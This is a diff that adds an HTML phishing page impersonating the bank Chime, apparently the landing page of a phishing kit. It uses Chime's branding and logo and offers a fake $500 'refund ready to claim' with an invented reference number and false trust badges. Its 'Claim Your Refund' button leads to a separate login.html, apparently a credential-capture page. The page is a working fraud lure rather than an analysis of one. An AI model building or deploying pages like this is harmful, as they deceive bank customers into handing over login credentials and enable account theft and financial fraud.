@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chime - Refund Ready</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --chime-green: #00b67a;
+            --chime-green-light: #e6f7f0;
+            --chime-dark: #0a1e3c;
+            --chime-gray: #6b7a8f;
+            --chime-gray-light: #f5f7fa;
+            --chime-border: #e4e8ee;
+            --shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+            --shadow-hover: 0 32px 80px rgba(0, 0, 0, 0.12);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--chime-gray-light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* ===== ANIMATED BACKGROUND ===== */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 30% 50%, rgba(0, 182, 122, 0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 70% 80%, rgba(0, 182, 122, 0.04) 0%, transparent 50%);
+            z-index: -1;
+            animation: floatBackground 20s ease-in-out infinite alternate;
+        }
+
+        @keyframes floatBackground {
+            0% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+            100% {
+                transform: translate(2%, 3%) rotate(3deg);
+            }
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.4s ease;
+            position: relative;
+        }
+
+        .card:hover {
+            transform: translateY(-6px);
+            box-shadow: var(--shadow-hover);
+        }
+
+        /* ===== GLOW EFFECT ===== */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(135deg, #00b67a, #00d4a0, #00b67a);
+            background-size: 300% 300%;
+            border-radius: 34px;
+            z-index: -1;
+            opacity: 0.2;
+            animation: glowPulse 4s ease-in-out infinite;
+        }
+
+        @keyframes glowPulse {
+            0%,
+            100% {
+                background-position: 0% 50%;
+                opacity: 0.2;
+            }
+            50% {
+                background-position: 100% 50%;
+                opacity: 0.4;
+            }
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 24px 16px;
+            border-bottom: 1px solid var(--chime-border);
+            background: #ffffff;
+        }
+
+        .header .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+
+        .header .logo img {
+            height: 28px;
+            width: auto;
+        }
+
+        .header .logo span {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--chime-dark);
+            letter-spacing: -0.5px;
+        }
+
+        /* ===== REFUND BANNER ===== */
+        .refund-banner {
+            background: linear-gradient(135deg, #0a1e3c, #1a3a5c);
+            padding: 28px 24px 24px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .refund-banner::after {
+            content: '💰';
+            position: absolute;
+            right: -20px;
+            bottom: -30px;
+            font-size: 120px;
+            opacity: 0.04;
+            transform: rotate(10deg);
+        }
+
+        .refund-banner .refund-label {
+            font-size: 13px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 4px;
+        }
+
+        .refund-banner .refund-amount {
+            font-size: 52px;
+            font-weight: 900;
+            color: #00b67a;
+            letter-spacing: -2px;
+            line-height: 1.1;
+        }
+
+        .refund-banner .refund-amount .currency {
+            font-size: 28px;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.4);
+            margin-right: 4px;
+        }
+
+        .refund-banner .refund-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 12px;
+            padding: 6px 18px;
+            background: rgba(0, 182, 122, 0.12);
+            border-radius: 100px;
+            border: 1px solid rgba(0, 182, 122, 0.15);
+            font-size: 13px;
+            font-weight: 600;
+            color: #00b67a;
+        }
+
+        .refund-banner .refund-status .dot {
+            width: 8px;
+            height: 8px;
+            background: #00b67a;
+            border-radius: 50%;
+            animation: pulseDot 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseDot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(0.8);
+            }
+        }
+
+        /* ===== CONTENT ===== */
+        .content {
+            padding: 28px 24px 24px;
+        }
+
+        /* ===== HEADLINE ===== */
+        .headline {
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .headline h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--chime-dark);
+            margin-bottom: 6px;
+        }
+
+        .headline p {
+            font-size: 15px;
+            color: var(--chime-gray);
+            line-height: 1.6;
+        }
+
+        /* ===== DETAILS CARD ===== */
+        .details-card {
+            background: var(--chime-gray-light);
+            border-radius: 16px;
+            padding: 20px 20px 16px;
+            margin-bottom: 24px;
+            border: 1px solid var(--chime-border);
+        }
+
+        .details-card .details-title {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--chime-gray);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 12px;
+        }
+
+        .details-card .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--chime-border);
+            font-size: 14px;
+        }
+
+        .details-card .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .details-card .detail-row .label {
+            color: var(--chime-gray);
+            font-weight: 500;
+        }
+
+        .details-card .detail-row .value {
+            color: var(--chime-dark);
+            font-weight: 600;
+        }
+
+        .details-card .detail-row .value .highlight {
+            color: #00b67a;
+            background: rgba(0, 182, 122, 0.1);
+            padding: 1px 10px;
+            border-radius: 4px;
+            font-weight: 700;
+        }
+
+        /* ===== INFO BANNER ===== */
+        .info-banner {
+            background: #e6f7f0;
+            border-radius: 12px;
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            border-left: 3px solid #00b67a;
+        }
+
+        .info-banner i {
+            color: #00b67a;
+            font-size: 18px;
+        }
+
+        .info-banner p {
+            font-size: 13px;
+            color: #0a1e3c;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        .info-banner p strong {
+            font-weight: 700;
+        }
+
+        /* ===== CTA BUTTON ===== */
+        .btn-claim {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #ffffff;
+            background: #00b67a;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            font-family: inherit;
+            text-decoration: none;
+            box-shadow: 0 4px 16px rgba(0, 182, 122, 0.25);
+        }
+
+        .btn-claim:hover {
+            background: #009e68;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(0, 182, 122, 0.35);
+        }
+
+        .btn-claim:active {
+            transform: scale(0.98);
+        }
+
+        .btn-claim i {
+            font-size: 18px;
+        }
+
+        /* ===== TRUST ROW ===== */
+        .trust-row {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-top: 24px;
+            flex-wrap: wrap;
+        }
+
+        .trust-row .stat {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .trust-row .stat i {
+            color: #00b67a;
+            font-size: 18px;
+        }
+
+        .trust-row .stat .number {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--chime-dark);
+        }
+
+        .trust-row .stat .label {
+            font-size: 12px;
+            color: var(--chime-gray);
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            padding: 16px 24px;
+            border-top: 1px solid var(--chime-border);
+            font-size: 12px;
+            color: var(--chime-gray);
+            background: #fafbfc;
+        }
+
+        .footer a {
+            color: #00b67a;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+
+            .card {
+                border-radius: 20px;
+            }
+
+            .refund-banner {
+                padding: 20px 16px 18px;
+            }
+
+            .refund-banner .refund-amount {
+                font-size: 40px;
+            }
+
+            .refund-banner .refund-amount .currency {
+                font-size: 20px;
+            }
+
+            .header {
+                padding: 16px 16px 12px;
+            }
+
+            .header .logo img {
+                height: 22px;
+            }
+
+            .header .logo span {
+                font-size: 17px;
+            }
+
+            .content {
+                padding: 20px 16px 18px;
+            }
+
+            .headline h2 {
+                font-size: 19px;
+            }
+
+            .details-card {
+                padding: 16px;
+            }
+
+            .details-card .detail-row {
+                font-size: 13px;
+                padding: 8px 0;
+            }
+
+            .btn-claim {
+                font-size: 15px;
+                padding: 14px;
+            }
+
+            .trust-row {
+                gap: 16px;
+            }
+
+            .trust-row .stat .number {
+                font-size: 14px;
+            }
+
+            .footer {
+                padding: 12px 16px;
+                font-size: 11px;
+            }
+        }
+
+        /* ===== ANIMATIONS ===== */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card {
+            animation: fadeInUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== MAIN CARD ===== -->
+    <div class="card">
+
+        <!-- HEADER -->
+        <header class="header">
+            <a href="#" class="logo">
+                <img 
+                    src="https://chime-mobile-assets.prod-ext.chmfin.com/prod/v2/images/ck.logo.chime.chime_green.medium.registered.7f0b59b1062c@3x.png" 
+                    alt="Chime Logo"
+                    width="100"
+                    height="28"
+                />
+                <span>Chime</span>
+            </a>
+            <button class="close-btn" style="background:none;border:none;cursor:pointer;color:#6b7a8f;padding:4px;border-radius:50%;transition:all 0.2s;font-size:20px;" onclick="window.location.href='#'">
+                ✕
+            </button>
+        </header>
+
+        <!-- REFUND BANNER -->
+        <div class="refund-banner">
+            <div class="refund-label">Refund Amount</div>
+            <div class="refund-amount">
+                <span class="currency">$</span>500<span style="font-size: 24px; color: rgba(255,255,255,0.2);">.00</span>
+            </div>
+            <div class="refund-status">
+                <span class="dot"></span>
+                Ready for Claim
+            </div>
+        </div>
+
+        <!-- CONTENT -->
+        <div class="content">
+
+            <!-- HEADLINE -->
+            <div class="headline">
+                <h2>Your refund is ready to claim</h2>
+                <p>Log in to your Chime account to access your funds instantly.</p>
+            </div>
+
+            <!-- DETAILS CARD -->
+            <div class="details-card">
+                <div class="details-title">📋 Refund Details</div>
+                <div class="detail-row">
+                    <span class="label">Amount</span>
+                    <span class="value"><span class="highlight">$500.00 USD</span></span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Status</span>
+                    <span class="value" style="color:#00b67a;">✅ Ready for Claim</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Reference</span>
+                    <span class="value">#CHIME-500-2026</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Processed</span>
+                    <span class="value">August 18, 2026</span>
+                </div>
+            </div>
+
+            <!-- INFO BANNER -->
+            <div class="info-banner">
+                <i class="fas fa-shield-alt"></i>
+                <p><strong>Secure & Instant</strong> — Your refund will be deposited directly into your Chime account upon approval.</p>
+            </div>
+
+            <!-- CTA BUTTON -->
+            <a href="login.html" class="btn-claim">
+                <i class="fas fa-gift"></i> Claim Your Refund
+            </a>
+
+            <!-- TRUST ROW -->
+            <div class="trust-row">
+                <div class="stat">
+                    <i class="fas fa-users"></i>
+                    <div>
+                        <div class="number">12M+</div>
+                        <div class="label">Members</div>
+                    </div>
+                </div>
+                <div class="stat">
+                    <i class="fas fa-clock"></i>
+                    <div>
+                        <div class="number">24/7</div>
+                        <div class="label">Access</div>
+                    </div>
+                </div>
+                <div class="stat">
+                    <i class="fas fa-shield-alt"></i>
+                    <div>
+                        <div class="number">FDIC</div>
+                        <div class="label">Insured</div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            &copy; 2026 Chime. All Rights Reserved. &nbsp;·&nbsp; <a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms</a>
+        </div>
+
+    </div>
+
+    <!-- ============================================
+    JAVASCRIPT
+    ============================================ -->
+    <script>
+        console.log('🔥 Chime - Landing Page');
+        console.log('💰 Refund Amount: $500.00 USD');
+        console.log('✅ Click "Claim Your Refund" → login.html');
+    </script>
+
+</body>
+</html>
